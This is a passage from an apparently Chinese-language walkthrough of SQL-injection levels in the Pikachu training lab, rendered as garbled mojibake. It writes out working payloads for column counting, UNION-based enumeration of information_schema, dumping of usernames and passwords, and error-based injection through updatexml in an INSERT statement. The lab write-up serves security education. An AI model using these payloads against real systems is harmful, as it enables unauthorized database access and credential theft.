å¹¶ä¸”ä¹Ÿä¸éœ€è¦é—­åˆå­—ç¬¦ã€‚



ç›´æ¥è®©ä»–è¿”å›æ‰€æœ‰æ•°æ®ï¼š`1 or 1=1`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631389.png)



### æ­£ç¡®çš„æµ‹è¯•åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š
```plsql
-- ===============================
-- ç¡®å®šå½“å‰æŸ¥è¯¢è¿”å›çš„å­—æ®µæ•°ï¼ˆåˆ—æ•°ï¼‰
-- ===============================
ï¼ˆ1ï¼‰
-- å°è¯•æŒ‰ç¬¬ 2 åˆ—æ’åº
-- é¡µé¢æ­£å¸¸ â†’ è‡³å°‘æœ‰ 2 åˆ—
1 order by 2
ï¼ˆ2ï¼‰
-- å°è¯•æŒ‰ç¬¬ 3 åˆ—æ’åº
-- å¦‚æœæŠ¥é”™ â†’ è¯´æ˜åŸå§‹ SQL åªæœ‰ 2 åˆ—
-- å¾—å‡ºç»“è®ºï¼šå­—æ®µæ•° = 2
1 order by 3

-- ===============================
-- æµ‹è¯• UNION æ³¨å…¥æ˜¯å¦å¯ç”¨
-- ===============================
ï¼ˆ3ï¼‰
-- -1 è®©åŸå§‹æŸ¥è¯¢æ— ç»“æœï¼ˆWHERE id = -1ï¼‰
-- union select 1,2 ä½¿ç”¨ç›¸åŒå­—æ®µæ•°è¿›è¡Œ UNION
-- å¦‚æœé¡µé¢å›æ˜¾ 1 æˆ– 2 â†’ UNION æ³¨å…¥æˆåŠŸ
-- åŒæ—¶ç¡®è®¤å“ªä¸€åˆ—æ˜¯â€œå›æ˜¾ä½â€
-1 union select 1,2

-- ===============================
-- è·å–æ•°æ®åº“åŸºæœ¬ä¿¡æ¯
-- ===============================
ï¼ˆ4ï¼‰
-- database() ï¼šå½“å‰ä½¿ç”¨çš„æ•°æ®åº“å
-- version()  ï¼šæ•°æ®åº“ç‰ˆæœ¬ï¼ˆMySQL ç‰ˆæœ¬ï¼‰
-- ç”¨äºç¡®è®¤ç›®æ ‡ç¯å¢ƒ & åç»­ payload å…¼å®¹æ€§
-1 union select database(),version()

-- ===============================
-- æšä¸¾å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨å
-- ===============================
ï¼ˆ5ï¼‰
-- information_schema.tablesï¼šå­˜å‚¨æ‰€æœ‰æ•°æ®åº“çš„è¡¨ä¿¡æ¯
-- table_schema='pikachu'ï¼šé™å®šåªçœ‹ pikachu æ•°æ®åº“
-- group_concatï¼šæŠŠå¤šä¸ªè¡¨åæ‹¼æ¥æˆä¸€è¡Œæ˜¾ç¤º
-- 2ï¼šç”¨äºå ä½ï¼Œä¿è¯å­—æ®µæ•°åŒ¹é…
-1 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'

-- ===============================
-- æšä¸¾ users è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µå
-- ===============================
ï¼ˆ6ï¼‰
-- information_schema.columnsï¼šå­˜å‚¨è¡¨çš„å­—æ®µç»“æ„
-- è·å– users è¡¨ä¸­æ‰€æœ‰åˆ—å
-- å¸¸è§ä¼šçœ‹åˆ°ï¼šidã€usernameã€password ç­‰
-1 union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'

-- ===============================
-- è¯»å– users è¡¨ä¸­çš„æ•æ„Ÿæ•°æ®
-- ===============================
ï¼ˆ7ï¼‰
-- ç›´æ¥è¯»å– users è¡¨
-- group_concat(username)ï¼šæ‹¼æ¥æ‰€æœ‰ç”¨æˆ·å
-- group_concat(password)ï¼šæ‹¼æ¥æ‰€æœ‰å¯†ç 
-- æˆåŠŸå®ç°â€œæ•°æ®è„±åº“â€
-1 union select group_concat(username),group_concat(password) from users

```



ä»¥ä¸‹æ˜¯æµ‹è¯•è¿‡ç¨‹ï¼š

ï¼ˆ1ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633465.png)

ï¼ˆ2ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621660.png)

ï¼ˆ3ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617913.png)

ï¼ˆ4ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622859.png)

ï¼ˆ5ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630277.png)



ï¼ˆ6ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626619.png)



ï¼ˆ7ï¼‰è¿™æ ·å°±å¯ä»¥æŠŠè¿™ä¸ªè¡¨ä¸­çš„æ‰€æœ‰æ•æ„Ÿä¿¡æ¯çˆ†å‡ºæ¥äº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636516.png)



## 4.2 å­—ç¬¦å‹æ³¨å…¥ï¼ˆgetï¼‰
æœ‰äº†ä¸Šä¸€é¢˜çš„ç»éªŒï¼Œè¿™ä¸€é¢˜å°±å¥½åšäº†





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623183.png)

è¿›è¡Œæµ‹è¯•ï¼š

```plsql
ï¼ˆ1ï¼‰-- é¡µé¢æ­£å¸¸
1
ï¼ˆ2ï¼‰-- é¡µé¢æŠ¥é”™
1'
ï¼ˆ3ï¼‰-- é¡µé¢æ­£å¸¸
1''
```



ï¼ˆ1ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623782.png)

ï¼ˆ2ï¼‰

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1`

**You have an error in your SQL syntax;**

ä½ å†™çš„ SQL è¯­æ³•æœ‰é”™è¯¯

**check the manual that corresponds to your MySQL server version**	

å»çœ‹ä½ å½“å‰ MySQL ç‰ˆæœ¬å¯¹åº”çš„è¯­æ³•æ‰‹å†Œ

**for the right syntax to use near ''1''' at line 1**  
é”™è¯¯å‘ç”Ÿåœ¨ **é è¿‘ **`**''1'''**`** çš„åœ°æ–¹ï¼Œåœ¨ç¬¬ 1 è¡Œ**

****

è¿™å°±å¾ˆæ˜æ˜¾äº†ï¼Œå•å¼•å·çš„æ•°é‡ä¸å¯¹ï¼Œ

å‡è®¾åç«¯çš„ SQL æ˜¯è¿™æ ·çš„ï¼š

```plsql
SELECT * FROM users WHERE id = '$id';
```

å’‹ä»¬ä¼ å…¥çš„æ˜¯ `1'`ï¼Œåœ¨åç«¯ä¸­ SQL è¯­å¥å˜æˆäº†ï¼š

```plsql
SELECT * FROM users WHERE id = '1'';
```

æ‰€ä»¥ä¼šæŠ¥é”™ï¼Œ



åœ¨æµ‹è¯•ä¸­ï¼Œè¿™ç§æƒ…å†µè¯´æ˜ï¼š

+ è¿™é‡Œæ˜¯**å­—ç¬¦å‹æ³¨å…¥ç‚¹**
+ **å•å¼•å·æˆåŠŸå½±å“äº† SQL è¯­å¥çš„ç»“æ„**



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622630.png)



ï¼ˆ3ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630846.png)



æ‰¾åˆ°äº†æ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”æ˜¯å•å¼•å·é—­åˆï¼Œé‚£ä¹ˆä¹‹åçš„å°±å’Œä¸Šä¸€å…³ä¸€è‡´ï¼š

```plsql
ï¼ˆ1ï¼‰
1' order by 2#
ï¼ˆ2ï¼‰
1' order by 3#

ï¼ˆ3ï¼‰
-1' union select 1,2#

ï¼ˆ4ï¼‰çˆ†æ•°æ®åº“å
-1' union select database(),version()#

ï¼ˆ5ï¼‰çˆ†è¡¨åï¼ˆtable_nameï¼‰ï¼šæŸ¥çœ‹å½“å‰æ•°æ®åº“é‡Œæœ‰å“ªäº›è¡¨
-1' union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'#

ï¼ˆ6ï¼‰çˆ†å­—æ®µåï¼ˆcolumn_nameï¼‰ï¼šusers è¡¨é‡Œæœ‰å“ªäº›å­—æ®µï¼Ÿ
-1' union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'#

ï¼ˆ7ï¼‰çˆ†æ•°æ®ï¼šæŠŠ users è¡¨é‡Œçš„è´¦å·å’Œå¯†ç éƒ½æ‹–å‡ºæ¥
-1' union select group_concat(username),group_concat(password) from users#

```



ï¼ˆ1ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636580.png)

ï¼ˆ2ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626445.png)

ï¼ˆ3ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625700.png)

ï¼ˆ4ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617923.png)

ï¼ˆ5ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624118.png)

ï¼ˆ6ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623920.png)

ï¼ˆ7ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635280.png)







ä¹Ÿå¯ä»¥ä½¿ç”¨ `**' or '1'='1**`å°†æ‰€æœ‰æ•°æ®æ‹¿å‡ºæ¥

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629228.png)



## 4.3 æœç´¢å‹æ³¨å…¥
è¿™é‡Œæåˆ°çš„æœç´¢å‹æ³¨å…¥ï¼Œå®é™…ä¸Šæ˜¯ SQL çš„å‚æ•°è¢«æ”¾è¿› `**LIKE '%å‚æ•°%'**`é‡Œï¼Œè¿›è¡Œäº†**æ¨¡ç³ŠæŸ¥è¯¢**

SQl è¯­å¥ï¼š

```plsql
SELECT username,password FROM users WHERE username LIKE '%aaa%'
```

ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥çš„æ˜¯ aaa ï¼Œè¿™é‡Œæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚



æ¯”å¦‚è¾“å…¥ `1'`ï¼Œé‚£ä¹ˆ SQL è¯­å¥å˜æˆï¼š`LIKE '%1'%'`ï¼Œå¼•å·ä¸åŒ¹é…->æŠ¥é”™->å¯æ³¨å…¥ç‚¹





å›åˆ°æ­£é¢˜ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªæœç´¢æ¡†ï¼š

æœç´¢ï¼ša

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634283.png)

è¿›è¡Œäº†æŸ¥è¯¢

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631522.png)





æµ‹è¯•æ³¨å…¥ç‚¹ï¼š

`1'`

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`

å¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹

æ ¹æ®æŠ¥é”™ï¼š`'%''`å¯ä»¥ç¡®å®š SQL çš„å®é™…ç»“æ„ä¸º `LIKE '%1'%'`ï¼Œæ˜¯æœç´¢å‹æ³¨å…¥æ— è¯¯ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625885.png)



é—­åˆæ–¹å¼å°±å¯ä»¥è¿™æ ·å†™ï¼š

1ï¼‰`%' or 1=1#`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619421.png)

2ï¼‰`' or 1=1-- q`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636281.png)

3) `' or 1=1-- `ï¼ˆ-- åé¢æœ‰**ç©ºæ ¼**ï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636312.png)





æ¥ä¸‹æ¥è¿˜æ˜¯**åº“-è¡¨-å­—æ®µ-æ•°æ®**

****

```plsql
ï¼ˆ1ï¼‰
%' union select 1,2,3#

ï¼ˆ2ï¼‰
%' union select database(),version(),3#

ï¼ˆ3ï¼‰çˆ†æ•°æ®åº“å
%' union select database(),version(),3#

ï¼ˆ4ï¼‰çˆ†è¡¨åï¼ˆtable_nameï¼‰ï¼šæŸ¥çœ‹å½“å‰æ•°æ®åº“é‡Œæœ‰å“ªäº›è¡¨
%' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='pikachu'#

ï¼ˆ5ï¼‰çˆ†å­—æ®µåï¼ˆcolumn_nameï¼‰ï¼šusers è¡¨é‡Œæœ‰å“ªäº›å­—æ®µï¼Ÿ
%' union select group_concat(column_name),2,3 from information_schema.columns where table_schema='pikachu' and table_name='users'#

ï¼ˆ6ï¼‰çˆ†æ•°æ®ï¼šæŠŠ users è¡¨é‡Œçš„è´¦å·å’Œå¯†ç éƒ½æ‹–å‡ºæ¥
%' union select group_concat(username),group_concat(password),3 from users#

```





## 4.4 xx å‹æ³¨å…¥
è¾“å…¥ `'`ï¼Œå‡ºç°æŠ¥é”™ï¼š

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')' at line 1`

æ­¤å¤„å¼•å·ä¸åŒ¹é…ï¼Œå¹¶ä¸”å¤šäº†ä¸€ä¸ªå³æ‹¬å·ï¼Œæ¨æµ‹åç«¯ SQL è¯­å¥åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š

```plsql
WHERE (username = 'aaa')
```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623655.png)



é—­åˆæ‹¬å·å’Œå¼•å·ï¼š`')#` æˆåŠŸé—­åˆ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617418.png)



```plsql
ï¼ˆ1ï¼‰
') union select 1,2#

ï¼ˆ2ï¼‰
') union select database(),version()#

ï¼ˆ3ï¼‰çˆ†æ•°æ®åº“å
') union select database(),version()#

ï¼ˆ4ï¼‰çˆ†è¡¨åï¼ˆtable_nameï¼‰ï¼šæŸ¥çœ‹å½“å‰æ•°æ®åº“é‡Œæœ‰å“ªäº›è¡¨
') union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'#

ï¼ˆ5ï¼‰çˆ†å­—æ®µåï¼ˆcolumn_nameï¼‰ï¼šusers è¡¨é‡Œæœ‰å“ªäº›å­—æ®µï¼Ÿ
') union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'#

ï¼ˆ6ï¼‰çˆ†æ•°æ®ï¼šæŠŠ users è¡¨é‡Œçš„è´¦å·å’Œå¯†ç éƒ½æ‹–å‡ºæ¥
') union select group_concat(username),group_concat(password) from users#

```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620847.png)





## 4.5 "insert/update"æ³¨å…¥
è™½ç„¶æ ‡é¢˜çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘ä»¬çŸ¥é“è¿™ä¸€å…³æ˜¯**æŠ¥é”™æ³¨å…¥**å°±å¯ä»¥äº†



ç™»å½•æ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615786.png)

æµ‹è¯•â€œæ³¨å†Œâ€åŠŸèƒ½ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620686.png)



ä½†æ˜¯å‘ç°å¹¶ä¸èƒ½ç™»å½•æˆåŠŸï¼Œ



æ¥ç€æµ‹è¯•æ¯ä¸€ä¸ªå­—æ®µï¼š`username=1'&password=2&sex=3&phonenum=4&email=5&add=6&submit=submit`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625689.png)



`<font style="color:rgb(0, 0, 0);">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2'),'3','4','5','6')' at line 1</font>`

é‡ç‚¹ï¼š**near '2'),'3','4','5','6')' at line 1**

**å…³é”®ç‚¹ï¼š**

+ `**)**`**å‡ºç°åœ¨ **`**'2'**`**åé¢ï¼Œè¿™ç§æƒ…å†µä¸ VLAUES(..,..,..)çš„ç»“æ„ä¸€è‡´ï¼›**
+ **æŠ¥é”™ä¸­ä» **`**'2'**`**å¼€å§‹ï¼Œè€Œä¸æ˜¯ **`**'1'**`**ï¼Œè¯´æ˜ **`**'1'**`**å·²ç»æ˜¯è¢«å½“ä½œä¸€ä¸ªå®Œæ•´çš„è¯­å¥æ‹¼æ¥è¿›å»äº†ï¼Œé”™è¯¯å‘ç”Ÿåœ¨åç»­å€¼è§£æçš„é˜¶æ®µã€‚**

** **

æ¨æµ‹åç«¯ SQL è¯­å¥ï¼š

```plsql
INSERT INTO users(username, password, sex, phonenum, email, address) VALUES ('1', '2', '3', '4', '5', '6');
```

æˆ‘ä»¬ä¼ å…¥ `username = 1'`ï¼ŒSQL è¯­å¥å˜æˆ `VALUES ('1'', '2', '3', '4', '5', '6')`ï¼Œå¤šäº†ä¸€ä¸ª `'`å•å¼•å·ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚



åœ¨å‰å‡ å…³ä¸­ï¼Œæˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨ SELECT è¿›è¡Œ**è”åˆæ³¨å…¥**ï¼Œä½†æ˜¯æœ¬å…³ä¸­å¹¶ä¸æ˜¯ SELECT æ³¨å…¥ï¼ˆä»ä»–ä»¬çš„è¯­å¥ä¸Šå°±å¯ä»¥çŸ¥é“ï¼Œæ˜¯ä»€ä¹ˆæ³¨å…¥ï¼‰ã€‚



æŒ‰ç…§ä¹‹å‰çš„æ€è·¯ï¼Œæˆ‘ä»¬åº”è¯¥æ‰§è¡Œçš„æ“ä½œæ˜¯é—­åˆå‰é¢çš„ VALUES å¹¶æ³¨é‡Šæ‰åç»­çš„è¯­å¥ï¼Œè®©æ•°æ®åº“æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„é¢å¤–çš„ SQL è¯­å¥ã€‚



å°è¯•é—­åˆå¹¶æ³¨é‡Šï¼š`1');--+`

å¯ä»¥çœ‹åˆ°å·²ç»ä¸æŠ¥ä¹‹å‰çš„è¯­æ³•é”™è¯¯äº†ï¼Œè€Œæ˜¯å‡ºç°äº†æ–°çš„æŠ¥é”™ï¼š`<font style="color:rgb(0, 0, 0);">Column count doesn't match value count at row 1</font>`<font style="color:rgb(0, 0, 0);">ï¼ˆ å­—æ®µæ•° â‰  VALUES é‡Œçš„å€¼æ•°é‡  ï¼‰</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629194.png)



è¡¥é½ 6 ä¸ªå€¼ï¼š`1','2','3','4','5','6');--+`

æˆåŠŸæ‰§è¡Œäº† SQL è¯­å¥

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629923.png)



### â€”â€”â€”â€”æŠ¥é”™æ³¨å…¥â€”â€”â€”â€”
**æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼š**

æ ¹æ® MySQL æŠ¥é”™ **near **`**'2'),'3','4','5','6')'**`ï¼Œå¯ä»¥åˆ¤æ–­ SQL æ­£åœ¨è§£æä¸€ä¸ªä½äºæ‹¬å·ä¸­çš„å¤šå€¼åˆ—è¡¨ï¼Œä¸”æ¯ä¸ªå€¼è¢«å•å¼•å·åŒ…è£¹å¹¶ä»¥é€—å·åˆ†éš”ï¼Œå¯æ¨æ–­åç«¯ä½¿ç”¨çš„æ˜¯ `INSERT INTO â€¦ VALUES(...) `è¯­å¥ã€‚ 

INSERT â€¦ VALUES çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ

```plsql
INSERT INTO users (...) VALUES (...)
```

å®ƒçš„ç‰¹æ€§å°±æ˜¯**ä¸è¿”å›æ•°æ®**ï¼Œæ— è®ºæ’å…¥ä»€ä¹ˆï¼ŒæˆåŠŸè¿”å› trueï¼Œå¤±è´¥è¿”å› errorã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šåœ¨ `INSERT â€¦ VALUES` ç»“æ„ä¸­ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡ `UNION` æ§åˆ¶ç»“æœé›†ï¼Œå› æ­¤åªèƒ½åˆ©ç”¨åœ¨`VALUES` è¡¨è¾¾å¼æ±‚å€¼é˜¶æ®µ**å¿…ç„¶æ‰§è¡Œçš„æŠ¥é”™å‡½æ•°**ï¼Œä½¿æ•°æ®åº“åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡º**åŒ…å«æ•æ„Ÿä¿¡æ¯çš„é”™è¯¯**ï¼Œä»è€Œå®ç°**æŠ¥é”™æ³¨å…¥**ã€‚  



é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å°±æƒ³ï¼Œå¦‚ä½•æŠ¥é”™æ³¨å…¥ï¼Ÿ

ç»™å‡ºå¸¸ç”¨çš„ä¿©ç§å‡½æ•°ï¼š

> ## 1ã€`updatexml()`
> ### æ­£å¸¸è¯­æ³•:
> `updatexml(xml_document, xpath_expression, new_value)`
>
> ### ä½œç”¨ï¼š
> **ä¿®æ”¹ XML ä¸­ç¬¦åˆ XPath çš„èŠ‚ç‚¹**
>
> ## 2ã€`extractvalue()`
> ### æ­£å¸¸è¯­æ³•:
> `extractvalue(xml_document, xpath_expression)`
>
> ### ä½œç”¨ï¼š
> ** 	ä» XML ä¸­æå– XPath å¯¹åº”çš„å€¼  **
>
> ## 3ã€ ç‰¹æ€§
> XPath è¯­æ³•é”™è¯¯ä¼šè¢« MySQL åŸæ ·æŠ›å‡ºã€‚
>
> ä¾‹ï¼š å½“ XPath è¡¨è¾¾å¼ **éæ³•** æ—¶ï¼š `SELECT extractvalue(1, 'abc');`
>
>  MySQL ç›´æ¥æŠ¥é”™ï¼š`XPATH syntax error: 'abc'`
>
>  é”™è¯¯ä¿¡æ¯ä¸­åŒ…å«äº†ä¼ è¿›å»çš„å†…å®¹  
>
> é‚£æˆ‘ä»¬æŠŠéæ³•å‚æ•°æ‹¼æ¥è¿›é”™è¯¯ä¿¡æ¯å¹¶å›æ˜¾ï¼š
>
> ## 4ã€payload 
> ### `updatexml(1, concat(0x7e, database()), 1)`
> åˆ†æä¸€ä¸‹ï¼š
>
> + `xml_document = 1`ï¼šæ˜æ˜¾ä¸æ˜¯ XMLï¼Œä½† MySQL **ä¸ä¼šå…ˆæ ¡éªŒå®ƒï¼Œ**ä¼šç»§ç»­è§£æ XPath
> +  `XPath = concat(0x7e, database())`ï¼š 
>     - `concat()`ï¼š
>     - `0x7e(~)`ï¼šXPath é‡Œéæ³•ï¼Œè€Œä¸”ä¸ä¼šå’Œ SQL å…³é”®å­—å†²çª
>     - **å‡è®¾æ•°æ®åº“åæ˜¯ **`**pikachu**`**æ‹¼æ¥åæ˜¯ï¼š**`**~pikachu**`**ï¼Œ è¿™ ä¸æ˜¯åˆæ³• XPath**
>
> MySQL åœ¨è§£æ XPath æ—¶ï¼Œå°±ä¼šç›´æ¥æŠ¥é”™ `XPATH syntax error: '~pikachu'`
>
> **æ•°æ®åº“åè¢«â€œå¤¹å¸¦â€è¿›äº†é”™è¯¯ä¿¡æ¯**
>
> ****
>
> æŠŠæˆ‘ä»¬çš„ payload æ”¾è¿› VALUES ä¸­ï¼š
>
> `VALUES (updatexml(1,concat(0x7e,database()),1)),'2','3','4','5','6')`
>
> `updatexml()`å¿…å®šè¢«è®¡ç®—ï¼Œè§¦å‘æŠ¥é”™ï¼Œè¿”å›æ•°æ®åº“åã€‚
>



`updatexml` å’Œ `extractvalue` å¹¶ä¸æ˜¯ç”¨æ¥è¯»å–æ•°æ®çš„ï¼Œè€Œæ˜¯åˆ©ç”¨ **MySQL åœ¨è§£æéæ³• XPath æ—¶ä¼šå°†å‚æ•°æ‹¼æ¥è¿›é”™è¯¯ä¿¡æ¯çš„ç‰¹æ€§**ï¼Œåœ¨ INSERT ç­‰æ— ç»“æœé›†è¯­å¥ä¸­ï¼Œé€šè¿‡**å¼ºåˆ¶æ‰§è¡Œè¡¨è¾¾å¼è§¦å‘æŠ¥é”™**ï¼Œä»è€Œå®ç°ä¿¡æ¯å›æ˜¾ã€‚  



### â€”â€”â€”â€”æ­£æ–‡â€”â€”â€”â€”
#### 1ï¼‰æŸ¥æ•°æ®åº“å
ç»“åˆä¸Šæ–‡ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„ payloadï¼š

`1','2','3','4','5','6');--+`

`updatexml(1,concat(0x7e,database()),1)--+`

->`1' or updatexml(1,concat(0x7e,database()),1),'2','3','4','5','6');--+`



> ä¸ºä»€ä¹ˆå†™ or ?
>
> å½“ä¼ å…¥`1' or updatexml(1,concat(0x7e,database()),1),'2','3','4','5','6');--+` æ—¶ï¼Œ
>
> SQL è¯­å¥å˜æˆäº†ï¼š
>
> `INSERT INTO users VALUES (`
>
> `  '1' OR updatexml(1,concat(0x7e,database()),1),`
>
> `  '2','3','4','5','6'`
>
> `);`
>
> `**or**`** çš„ä½œç”¨ä¸æ˜¯â€œé€»è¾‘åˆ¤æ–­â€ï¼Œè€Œæ˜¯ï¼š  
